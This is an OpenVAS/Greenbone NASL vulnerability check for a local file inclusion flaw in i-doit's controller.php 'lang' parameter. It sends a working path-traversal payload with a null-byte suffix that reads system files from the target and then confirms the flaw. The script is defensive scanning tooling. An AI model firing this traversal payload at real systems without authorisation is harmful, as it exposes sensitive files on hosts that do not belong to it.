if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902601" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)" );
	script_bugtraq_id( 47972 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "i-doit 'lang' Parameter Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17320/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to gain sensitive
  information." );
	script_tag( name: "affected", value: "i-doit version 0.9.9-4 and earlier." );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user supplied input
  via the 'lang' parameter in 'controller.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running I-doit and is prone to local file inclusion
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/idoit", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, "i-doit.org" ) && ContainsString( res, "<title>i-doit - </title>" )){
		files = traversal_files();
		for file in keys( files ) {
			url = NASLString( dir, "/controller.php?load=&lang=..%2f..%2f..%2f..%2f" + "..%2f..%2f..%2f..%2f", files[file], "%00.jpg" );
			if(http_vuln_check( port: port, url: url, pattern: file )){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

